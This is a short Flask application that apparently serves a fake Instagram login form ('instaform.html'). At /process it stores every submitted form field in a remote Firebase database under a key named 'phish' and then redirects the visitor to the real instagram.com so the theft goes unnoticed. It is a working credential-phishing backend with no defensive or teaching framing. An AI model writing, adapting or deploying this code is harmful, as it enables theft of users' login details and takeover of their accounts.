from flask import Flask,render_template,request,redirect,url_for
import json
import smtplib
from firebase import firebase


firebase = firebase.FirebaseApplication('https://alpine-gasket-284418.firebaseio.com')
app = Flask(__name__)

@app.route('/')
@app.route('/index')
def index():
    return render_template('instaform.html')

@app.route('/process',methods=['GET','POST'])
def process():
    if request.method == 'POST':
        data = request.form
        firebase.put('phish',"1",data)
        
        return redirect("http://www.instagram.com")




if __name__=="__main__":
    app.run(debug=True)